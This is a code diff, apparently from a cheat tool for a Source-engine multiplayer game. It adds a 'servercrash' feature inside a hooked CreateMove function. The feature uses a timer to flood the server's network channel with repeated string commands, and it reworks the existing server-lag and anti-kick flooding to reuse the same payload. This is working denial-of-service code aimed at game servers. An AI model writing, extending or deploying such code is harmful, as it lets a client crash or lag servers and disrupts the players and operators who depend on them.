@@ -477,25 +477,30 @@ DEFINE_HOOKED_METHOD(CreateMove, bool, void *this_, float input_sample_time,
         if (cmd)
             g_Settings.last_angles = cmd->viewangles;
     }
+    NET_StringCmd senddata(serverlag_string.GetString());
+    INetChannel *ch = (INetChannel *) g_IEngine->GetNetChannelInfo();
+    senddata.SetNetChannel(ch);
+    senddata.SetReliable(false);
+    if (servercrash && DelayTimer.check((int)delay * 1000)) {
+        for (int i = 0; i < 7800; i+= sizeof(serverlag_string.GetString()))
+            ch->SendNetMsg(senddata);
+        ch->Transmit();
+    }
     if (serverlag_amount || votelogger::antikick_ticks)
     {
-        NET_StringCmd senddata("voicemenu 0 0");
-        INetChannel *ch2 = (INetChannel *) g_IEngine->GetNetChannelInfo();
-        senddata.SetNetChannel(ch2);
-        senddata.SetReliable(false);
         if (votelogger::antikick_ticks)
             votelogger::antikick_ticks--;
         if (votelogger::antikick_ticks)
         {
-            for (int i = 0; i < (int) 500; i++)
-                ch2->SendNetMsg(senddata, false);
-            ch2->Transmit();
+            for (int i = 0; i < 7800; i+= sizeof(serverlag_string.GetString()))
+                ch->SendNetMsg(senddata, false);
+            ch->Transmit();
         }
-        else if (!votelogger::antikick_ticks)
+        else if (!votelogger::antikick_ticks && DelayTimer.check((int)delay * 1000))
         {
             for (int i = 0; i < (int) serverlag_amount; i++)
-                ch2->SendNetMsg(senddata, false);
-            ch2->Transmit();
+                ch->SendNetMsg(senddata, false);
+            ch->Transmit();
         }
     }
 
